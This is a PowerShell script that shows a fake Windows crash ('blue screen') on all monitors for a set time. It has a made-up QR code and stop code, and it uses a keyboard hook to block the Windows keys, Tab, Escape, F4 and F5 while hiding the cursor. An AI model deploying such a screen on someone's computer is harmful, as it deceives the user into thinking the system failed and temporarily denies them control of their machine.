$p = Get-Content "$PSScriptRoot\params_$($args[0]).json" | ConvertFrom-Json
$duration = $p.Time

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Install() {
        var mod = GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
        hookId = SetWindowsHookEx(13, proc, mod, 0);
    }
    public static void Uninstall() { UnhookWindowsHookEx(hookId); }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vk = Marshal.ReadInt32(lParam);
            if (vk == 0x5B || vk == 0x5C) return (IntPtr)1;
            if (vk == 0x09 || vk == 0x1B || vk == 0x73 || vk == 0x74) return (IntPtr)1;
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}

public class CursorHider {
    [DllImport("user32.dll")] public static extern int ShowCursor(bool bShow);
    public static void Hide() { for(int i=0;i<10;i++) ShowCursor(false); }
    public static void Show() { for(int i=0;i<10;i++) ShowCursor(true); }
}
"@

[KeyboardBlocker]::Install()
[CursorHider]::Hide()

$screens = [System.Windows.Forms.Screen]::AllScreens
$forms = @()

foreach ($screen in $screens) {
    $sw = $screen.Bounds.Width
    $sh = $screen.Bounds.Height

    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.WindowState = [System.Windows.Forms.FormWindowState]::Normal
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
    $form.Bounds = $screen.Bounds
    $form.ShowInTaskbar = $false
    $form.KeyPreview = $true

    $form.Add_KeyDown({
        $_.SuppressKeyPress = $true
        $_.Handled = $true
    })

    $marginLeft = [int]($sw * 0.10)
    $marginTop  = [int]($sh * 0.13)

    $labelFace = New-Object System.Windows.Forms.Label
    $labelFace.Text = ":("
    $emojiSize = [int]($sh * 0.16)
    $labelFace.Font = New-Object System.Drawing.Font("Segoe UI Light", $emojiSize, [System.Drawing.FontStyle]::Regular)
    $labelFace.ForeColor = [System.Drawing.Color]::White
    $labelFace.AutoSize = $true
    $labelFace.Location = New-Object System.Drawing.Point($marginLeft, $marginTop)
    $form.Controls.Add($labelFace)

    $msgTop = $marginTop + [int]($sh * 0.26)
    $labelMsg = New-Object System.Windows.Forms.Label
    $labelMsg.Text = "Your PC ran into a problem and needs to restart. We're`njust collecting some error info, and then we'll restart for you."
    $msgFontSize = [int]($sh * 0.024)
    $labelMsg.Font = New-Object System.Drawing.Font("Segoe UI", $msgFontSize, [System.Drawing.FontStyle]::Regular)
    $labelMsg.ForeColor = [System.Drawing.Color]::White
    $labelMsg.AutoSize = $true
    $labelMsg.Location = New-Object System.Drawing.Point($marginLeft, $msgTop)
    $form.Controls.Add($labelMsg)

    $pctTop = $msgTop + [int]($sh * 0.14)
    $labelPercent = New-Object System.Windows.Forms.Label
    $labelPercent.Text = "0% complete"
    $pctFontSize = [int]($sh * 0.024)
    $labelPercent.Font = New-Object System.Drawing.Font("Segoe UI", $pctFontSize, [System.Drawing.FontStyle]::Regular)
    $labelPercent.ForeColor = [System.Drawing.Color]::White
    $labelPercent.AutoSize = $true
    $labelPercent.Location = New-Object System.Drawing.Point($marginLeft, $pctTop)
    $form.Controls.Add($labelPercent)

    $qrTop = $pctTop + [int]($sh * 0.10)
    $qrSize = [int]($sh * 0.11)

    $qrBox = New-Object System.Windows.Forms.PictureBox
    $qrBox.Size = New-Object System.Drawing.Size($qrSize, $qrSize)
    $qrBox.Location = New-Object System.Drawing.Point($marginLeft, $qrTop)
    $qrBox.BackColor = [System.Drawing.Color]::White

    $qrBmp = New-Object System.Drawing.Bitmap($qrSize, $qrSize)
    $qrG = [System.Drawing.Graphics]::FromImage($qrBmp)
    $qrG.Clear([System.Drawing.Color]::White)
    $rng = New-Object System.Random(42)
    $cellCount = 25
    $cellSize = [int]($qrSize / $cellCount)
    $black = [System.Drawing.Brushes]::Black

    for ($row = 0; $row -lt $cellCount; $row++) {
        for ($col = 0; $col -lt $cellCount; $col++) {
            $edge = ($row -lt 7 -and $col -lt 7) -or ($row -lt 7 -and $col -ge ($cellCount-7)) -or ($row -ge ($cellCount-7) -and $col -lt 7)
            if ($edge) {
                $outerBorder = ($row -eq 0 -or $row -eq 6 -or $col -eq 0 -or $col -eq 6) -or ($row -ge ($cellCount-7) -and ($row -eq ($cellCount-7) -or $row -eq ($cellCount-1) -or $col -eq 0 -or $col -eq 6)) -or ($row -lt 7 -and $col -ge ($cellCount-7) -and ($row -eq 0 -or $row -eq 6 -or $col -eq ($cellCount-7) -or $col -eq ($cellCount-1)))
                if ($outerBorder -or ($row -ge 2 -and $row -le 4 -and $col -ge 2 -and $col -le 4) -or ($row -ge 2 -and $row -le 4 -and $col -ge ($cellCount-5) -and $col -le ($cellCount-3)) -or ($row -ge ($cellCount-5) -and $row -le ($cellCount-3) -and $col -ge 2 -and $col -le 4)) {
                    $qrG.FillRectangle($black, $col * $cellSize, $row * $cellSize, $cellSize, $cellSize)
                }
            } elseif ($rng.Next(2) -eq 1) {
                $qrG.FillRectangle($black, $col * $cellSize, $row * $cellSize, $cellSize, $cellSize)
            }
        }
    }

    $qrG.Dispose()
    $qrBox.Image = $qrBmp
    $form.Controls.Add($qrBox)

    $infoLeft = $marginLeft + $qrSize + [int]($sw * 0.015)
    $infoFontSize = [int]($sh * 0.013)

    $labelInfo1 = New-Object System.Windows.Forms.Label
    $labelInfo1.Text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
    $labelInfo1.Font = New-Object System.Drawing.Font("Segoe UI", $infoFontSize, [System.Drawing.FontStyle]::Regular)
    $labelInfo1.ForeColor = [System.Drawing.Color]::White
    $labelInfo1.AutoSize = $false
    $labelInfo1.Width = [int]($sw * 0.40)
    $labelInfo1.Height = [int]($sh * 0.06)
    $labelInfo1.Location = New-Object System.Drawing.Point($infoLeft, $qrTop)
    $form.Controls.Add($labelInfo1)

    $labelInfo2 = New-Object System.Windows.Forms.Label
    $labelInfo2.Text = "If you call a support person, give them this info:"
    $labelInfo2.Font = New-Object System.Drawing.Font("Segoe UI", $infoFontSize, [System.Drawing.FontStyle]::Regular)
    $labelInfo2.ForeColor = [System.Drawing.Color]::White
    $labelInfo2.AutoSize = $true
    $labelInfo2.Location = New-Object System.Drawing.Point($infoLeft, ($qrTop + [int]($sh * 0.06)))
    $form.Controls.Add($labelInfo2)

    $labelInfo3 = New-Object System.Windows.Forms.Label
    $labelInfo3.Text = "Stop code: CRITICAL_PROCESS_DIED"
    $labelInfo3.Font = New-Object System.Drawing.Font("Segoe UI", $infoFontSize, [System.Drawing.FontStyle]::Regular)
    $labelInfo3.ForeColor = [System.Drawing.Color]::White
    $labelInfo3.AutoSize = $true
    $labelInfo3.Location = New-Object System.Drawing.Point($infoLeft, ($qrTop + [int]($sh * 0.09)))
    $form.Controls.Add($labelInfo3)

    $forms += [PSCustomObject]@{ Form = $form; LabelPercent = $labelPercent }
    $form.Show()
    $form.BringToFront()
    $form.Activate()
}

$startTime = Get-Date
$endTime = $startTime.AddSeconds($duration)

while ((Get-Date) -lt $endTime) {
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    $percent = [math]::Min([math]::Round(($elapsed / $duration) * 100), 100)

    foreach ($f in $forms) {
        $f.LabelPercent.Text = "$percent% complete"
        $f.Form.TopMost = $true
        $f.Form.BringToFront()
        $f.Form.Refresh()
    }

    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 300
}

[KeyboardBlocker]::Uninstall()
[CursorHider]::Show()

foreach ($f in $forms) {
    $f.Form.Close()
    $f.Form.Dispose()
}